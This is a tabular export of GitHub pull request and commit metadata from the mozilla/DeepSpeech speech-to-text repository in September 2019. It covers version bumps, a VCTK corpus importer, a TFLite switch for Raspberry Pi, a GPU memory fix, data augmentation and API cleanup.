1866,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2379,2379,Bump VERSION to 0.6.0-alpha.7,,lissyx,1645737,2019-09-24T09:07:01Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,693648657f6409a329048e0bea2feb04197000e2,Bump VERSION to 0.6.0-alpha.7
1867,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2375,2375,Create import_vctk.py,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.

VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf


COPYING - https://homepages.inf.ed.ac.uk/jyamagis/page3/page58/page58.html

This corpus is licensed under Open Data Commons Attribution License (ODC-By) v1.0.
http://opendatacommons.org/licenses/by/1.0/
http://opendatacommons.org/licenses/by/summary/",rhamnett,6739670,2019-09-21T19:47:37Z,CONTRIBUTOR,True,204,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,792d8e0a276082ac93cbf53a008ca208f22441e9,Create import_vctk.py
1868,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90a39031f1035b3e5e4a8ec6eb9eac98196835a2,Create import_vctk.py
1869,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f8a4c744dd433dc9c78054e32c173e3dd4c3de2d,Update import_vctk.py
1870,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d98c905c361703d63b72a69c4ed1d2531a3e59c5,Update import_vctk.py
1871,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f74f53f48a02afaf9d7ea6ce4e6dba7111e451b6,Update import_vctk.py
1872,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1bcfc63a03800c8af62ce8f5cb91af1d6990bb0,Update import_vctk.py
1873,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a99d42ce4450aa6effe38fc8313f74b26da98896,Update import_vctk.py
1874,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5770372cf3f1aee42b8a87cc16c1ec929e919ac,Update import_vctk.py
1875,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2374,2374,New importer for VCTK corpus,"VCTK corpus contains high quality samples (48khz) of english transcription c.45 hours.

Importer converts samples to 16khz and creates suitable csv files manually split into train/dev/test after random shuffle (not sure if this is correct). A few bits of missing data and erroneous records are stripped.


VCTK Corpus - https://datashare.is.ed.ac.uk/handle/10283/2651
Used in Wavenet paper - https://arxiv.org/pdf/1609.03499.pdf",rhamnett,6739670,2019-09-20T19:47:12Z,CONTRIBUTOR,False,206,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61b3ef2d2785f9f1259128bb65f385527b81fbf3,Update import_vctk.py
1876,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2373,2373,Switch to TFLite for RPi3/4,,lissyx,1645737,2019-09-20T15:00:12Z,COLLABORATOR,True,139,36,38,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4103247a2136f7c14876cc313e288eaa2a321ff0,Use TFLite runtime on RPi3/RPi4
1877,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2372,2372,Bump VERSION to 0.6.0-alpha.6,,lissyx,1645737,2019-09-19T14:30:44Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,579925483b204c54c80b5c0a7737c3c1adc9c750,Bump VERSION to 0.6.0-alpha.6
1878,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2366,2366,Allow specifying --branch when getting decoder URL,,reuben,477142,2019-09-15T13:11:34Z,MEMBER,True,5,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82a5b370738ead30495c997ca5afa56f2ecc0714,Allow specifying --branch when getting decoder URL
1879,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2362,2362,All the docs,,lissyx,1645737,2019-09-13T09:19:54Z,COLLABORATOR,True,6033,63,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,458692692e90d92a6eff735416a5df394b8516b8,Fix header preprocessor alignment
1880,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2362,2362,All the docs,,lissyx,1645737,2019-09-13T09:19:54Z,COLLABORATOR,True,6033,63,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c4fa52e42022fd596e953625b3991329d4ee400,Re-enable readthedocs.io
1881,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2362,2362,All the docs,,lissyx,1645737,2019-09-13T09:19:54Z,COLLABORATOR,True,6033,63,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33281c4aac7aef14139fe0cac15432705506accd,Add TaskCluster documentation generation
1882,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2362,2362,All the docs,,lissyx,1645737,2019-09-13T09:19:54Z,COLLABORATOR,True,6033,63,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf7cc1df54c1414af4fcb42867ec9bca38013469,Sphinx doc
1883,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2362,2362,All the docs,,lissyx,1645737,2019-09-13T09:19:54Z,COLLABORATOR,True,6033,63,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b7ab994785b9d2769a66b1b0cf8508c313404a4,Fix pylint
1884,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2361,2361,Fixes bug of allocating full gpu memory,"After call to gpu list_local_devices, tensorflow allocates all gpu available memory which in turn block concurrent trainings. To solve this we need to pass seesion config to list_local_device function after adding allow_growth=True.",Jemyz,16296683,2019-09-13T08:34:13Z,CONTRIBUTOR,False,21,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,529c10bcdc154336edbb65393367bb3e0f2841b4,fixs bug of allocating full gpu memory
1885,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2361,2361,Fixes bug of allocating full gpu memory,"After call to gpu list_local_devices, tensorflow allocates all gpu available memory which in turn block concurrent trainings. To solve this we need to pass seesion config to list_local_device function after adding allow_growth=True.",Jemyz,16296683,2019-09-13T08:34:13Z,CONTRIBUTOR,False,21,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6dfe8dea54259513aa7f7b9f34d923b8a79b753d,passes config to list_local_devices
1886,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2361,2361,Fixes bug of allocating full gpu memory,"After call to gpu list_local_devices, tensorflow allocates all gpu available memory which in turn block concurrent trainings. To solve this we need to pass seesion config to list_local_device function after adding allow_growth=True.",Jemyz,16296683,2019-09-13T08:34:13Z,CONTRIBUTOR,False,21,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f130d4ec8c76edb09b7b8be15a8cce2cce98464b,Adds flag for allow growth
1887,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2361,2361,Fixes bug of allocating full gpu memory,"After call to gpu list_local_devices, tensorflow allocates all gpu available memory which in turn block concurrent trainings. To solve this we need to pass seesion config to list_local_device function after adding allow_growth=True.",Jemyz,16296683,2019-09-13T08:34:13Z,CONTRIBUTOR,False,21,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f1b55140ed67ebe89df6c7305fda3a7b64b3504,uses allow_growth flag instead of Hardcoding
1888,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2358,2358,Rename metadata probability field to confidence,,reuben,477142,2019-09-11T09:10:33Z,MEMBER,True,20,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ac498bc5090b186d00df46a61e5ec3e93e6f9bc,Rename metadata probability field to confidence
1889,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2358,2358,Rename metadata probability field to confidence,,reuben,477142,2019-09-11T09:10:33Z,MEMBER,True,20,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0e11c73cd18a01d0876b985541e2e66a5de46fc,Address review comments
1890,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2357,2357,Add MAGICDATA importer,,reuben,477142,2019-09-11T08:07:20Z,MEMBER,True,88,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,732d0b221d12e2e2e30fd2f14df8fcaea60bf20c,Add MAGICDATA importer
1891,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2355,2355,Augmentation Documentation,"Updated README with augmentation documentation. 
Usage of augmentation",cahuja1992,5588828,2019-09-10T04:57:38Z,CONTRIBUTOR,True,30,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,547373d4ec65250254ca2a675a39631fd7fee0c6,"Augmentation Documentation

Training with augmentation documentation"
1892,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2355,2355,Augmentation Documentation,"Updated README with augmentation documentation. 
Usage of augmentation",cahuja1992,5588828,2019-09-10T04:57:38Z,CONTRIBUTOR,True,30,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97395e537bc786181c0f6cb16575581742d3011c,Updated the documentation
1893,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2355,2355,Augmentation Documentation,"Updated README with augmentation documentation. 
Usage of augmentation",cahuja1992,5588828,2019-09-10T04:57:38Z,CONTRIBUTOR,True,30,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,36d46c24eeb914e21c371e089041a84672625b04,Updated the README
1894,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2355,2355,Augmentation Documentation,"Updated README with augmentation documentation. 
Usage of augmentation",cahuja1992,5588828,2019-09-10T04:57:38Z,CONTRIBUTOR,True,30,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a614409d85bb1406322530e36cc8f0210c70457,Updated the README
1895,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2355,2355,Augmentation Documentation,"Updated README with augmentation documentation. 
Usage of augmentation",cahuja1992,5588828,2019-09-10T04:57:38Z,CONTRIBUTOR,True,30,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2c4360626f2df45d287b08c6c02ab1a15bd0472,Merge branch 'master' of https://github.com/mozilla/DeepSpeech into patch-2
1896,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2355,2355,Augmentation Documentation,"Updated README with augmentation documentation. 
Usage of augmentation",cahuja1992,5588828,2019-09-10T04:57:38Z,CONTRIBUTOR,True,30,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c58ca7af1a25ecc7b726f263d1c69e26371372c,Corrected typo and better language about the augmentatio section
1897,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2354,2354,Run examples on TaskCluster,Fixes #2353,lissyx,1645737,2019-09-09T16:42:50Z,COLLABORATOR,True,325,53,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ef0117df0b573d596136c821e2afc5805cba9a2,"Run examples on TaskCluster

Fixes #2353"
1898,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2354,2354,Run examples on TaskCluster,Fixes #2353,lissyx,1645737,2019-09-09T16:42:50Z,COLLABORATOR,True,325,53,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b5a3e328dae95207f3341a126eb006dfbf37f7a4,"Update examples to run latest DeepSpeech

Fixes #2351"
1899,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2354,2354,Run examples on TaskCluster,Fixes #2353,lissyx,1645737,2019-09-09T16:42:50Z,COLLABORATOR,True,325,53,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5465747e374e4eef0bc0c096eb91eab151fbba0f,Fix linter errors
1900,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2352,2352,Data augmentation PR,Rebased #2284 and added some cleanup. Also opening a separate PR so tests are run.,reuben,477142,2019-09-09T10:20:58Z,MEMBER,True,132,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d5ef15ab701b6a190bd852b21ee9655ad73a226,-data-aug via additive and multiplicative noise in feature-space
1901,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2352,2352,Data augmentation PR,Rebased #2284 and added some cleanup. Also opening a separate PR so tests are run.,reuben,477142,2019-09-09T10:20:58Z,MEMBER,True,132,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0cc5ff230f572040c993dd8d061addb8f0df42a6,-spectrogram augmentations
1902,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2352,2352,Data augmentation PR,Rebased #2284 and added some cleanup. Also opening a separate PR so tests are run.,reuben,477142,2019-09-09T10:20:58Z,MEMBER,True,132,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49c6a9c9736f44d6fe27ef8e2bf15f76a95d4308,adding 'train_phase' to create_dataset. Now we can augment only the training-set.
1903,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2352,2352,Data augmentation PR,Rebased #2284 and added some cleanup. Also opening a separate PR so tests are run.,reuben,477142,2019-09-09T10:20:58Z,MEMBER,True,132,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b89fb04b97ee698f13a61160b87d832cb5b8be99,space after comma
1904,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2352,2352,Data augmentation PR,Rebased #2284 and added some cleanup. Also opening a separate PR so tests are run.,reuben,477142,2019-09-09T10:20:58Z,MEMBER,True,132,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e4eed7be3389fce471e826c2231f1a75c5c534d,removing trailing space
1905,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2352,2352,Data augmentation PR,Rebased #2284 and added some cleanup. Also opening a separate PR so tests are run.,reuben,477142,2019-09-09T10:20:58Z,MEMBER,True,132,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d051d4fd0e5cf096f0973abf7f0f4417f5a1c0a0,"Remove sparse image warp, fix boolean flags type, rebase to master"
1906,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2352,2352,Data augmentation PR,Rebased #2284 and added some cleanup. Also opening a separate PR so tests are run.,reuben,477142,2019-09-09T10:20:58Z,MEMBER,True,132,11,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6af8c5dc7d4326bc0c022d251bdd8c67e758af1,Remove some duplicated code
1907,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c402b971d6ccd14e70c55536ce2d165923940044,Remove unused params and make function names more consistent
1908,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61b9b0e84dce9e897f86d0e8a5e506316400be53,Add convenience header for backwards compatibility
1909,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a81542691874460e054991ebf721ee3333ce1360,Update client.cc
1910,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,249fdadc32b4d77747975c1b34de45572a41b0ce,Update Python bindings and client
1911,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc6741cd4175209fa2fb0a3ea4394ca668d3170b,Update JS bindings and client
1912,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a8c53d21542bcea377a69113bbf4f36010c4936b,Update .NET bindings and client
1913,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4e57902ba216b71a9b460a7e7b95ec8c530d08c,Update Java bindings
1914,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f8f6b33ccee1347fc35487eabdc6645e6b0a9468,Update .NET examples
1915,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b95ebea9ba0bd9da613d189c0be7b0c8e1a0ffa3,Fix linter error
1916,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2350,2350,[BREAKING] API cleanup,"Removed unused params, made naming more consistent.",reuben,477142,2019-09-09T10:04:08Z,MEMBER,True,206,183,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7abbe077d8de8bafeb3a0280cda0c01f2bacf4ac,"Add a #warning to deepspeech_compat.h

X-DeepSpeech: NOBUILD"
1917,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2346,2346,Save flag values next to checkpoints (Fixes #2345),,reuben,477142,2019-09-06T09:35:34Z,MEMBER,True,7,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba2d29b36f1a9c9f0298113e30cbe5694a0da7ee,Save flag values next to checkpoints
1918,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2346,2346,Save flag values next to checkpoints (Fixes #2345),,reuben,477142,2019-09-06T09:35:34Z,MEMBER,True,7,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,371e73eb69fd41acf6d90638e5b57752905c1745,Create checkpoint dir before writing flags file in it
1919,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2343,2343,Update README,Rendered: https://github.com/mozilla/DeepSpeech/blob/readme-update/README.md,reuben,477142,2019-09-04T14:57:04Z,MEMBER,True,82,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdd4530e66822b5b4473acf4cc8faeeee3a3e177,Update README
1920,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2343,2343,Update README,Rendered: https://github.com/mozilla/DeepSpeech/blob/readme-update/README.md,reuben,477142,2019-09-04T14:57:04Z,MEMBER,True,82,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a5d6dcf007ca1694e78e1fb61dd44db1f6ff19e,"Address review comments

X-DeepSpeech: NOBUILD"
1921,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2343,2343,Update README,Rendered: https://github.com/mozilla/DeepSpeech/blob/readme-update/README.md,reuben,477142,2019-09-04T14:57:04Z,MEMBER,True,82,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9851c949ac13d0ed8b134f078572b0725d2f1e9,Address review comments
1922,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2343,2343,Update README,Rendered: https://github.com/mozilla/DeepSpeech/blob/readme-update/README.md,reuben,477142,2019-09-04T14:57:04Z,MEMBER,True,82,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,36403cb64b8f386ad802ddc261df6071baf28a17,"Add model download and extraction to initial example

X-DeepSpeech: NOBUILD"
1923,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2329,2329,Run tf_upgrade_v2 to ease eventual transition to TF 2.0,This shouldn't break any tests.,reuben,477142,2019-08-28T16:17:27Z,MEMBER,True,44,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,670e06365e5faef86e37b574380e9c6b009e3f8e,Run tf_upgrade_v2 on our code
1924,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2329,2329,Run tf_upgrade_v2 to ease eventual transition to TF 2.0,This shouldn't break any tests.,reuben,477142,2019-08-28T16:17:27Z,MEMBER,True,44,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85d646350ff0ca66cecfda61fb5cf9e758e97a85,Update name of audio ops package in TF 1.14/TF 2.0
1925,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2327,2327,Switch from deprecated tfv1.app to absl-py,,reuben,477142,2019-08-28T09:10:41Z,MEMBER,True,10,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24bcdeb3d6befa7259159917205f0b7e78f5ebec,Switch from deprecated tfv1.app to absl-py
1926,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2325,2325,Test PR #2324,,reuben,477142,2019-08-28T07:00:06Z,MEMBER,False,18,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f15ea092548677a4e552490e4ec6df49c2ddeb58,Only use extern C when compiling as C++;
